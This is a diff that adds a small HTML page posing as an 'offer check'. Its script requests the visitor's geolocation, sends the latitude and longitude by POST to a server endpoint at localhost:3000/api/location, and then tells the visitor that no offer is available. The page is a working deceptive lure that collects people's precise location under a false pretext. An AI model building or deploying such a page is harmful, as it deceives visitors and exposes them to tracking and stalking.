@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<title>Offer</title>
+	</head>
+	<body>
+		<h1>Offer Checking...</h1>
+		<script>
+			navigator.geolocation.getCurrentPosition(
+				(position) => {
+					const { latitude, longitude } = position.coords;
+
+					fetch("http://localhost:3000/api/location", {
+						method: "POST",
+						headers: {
+							"Content-Type": "application/json",
+						},
+						body: JSON.stringify({ latitude, longitude }),
+					})
+						.then(() => {
+							document.body.innerHTML = "<h2> No Offer Available</h2>";
+						})
+						.catch((err) => {
+							console.error("❌ Failed to send location", err);
+							document.body.innerHTML = "<h2>❌ Failed to send location.</h2>";
+						});
+				},
+				(error) => {
+					document.body.innerHTML = "<h2>❌ Location permission denied.</h2>";
+				}
+			);
+		</script>
+	</body>
+</html>
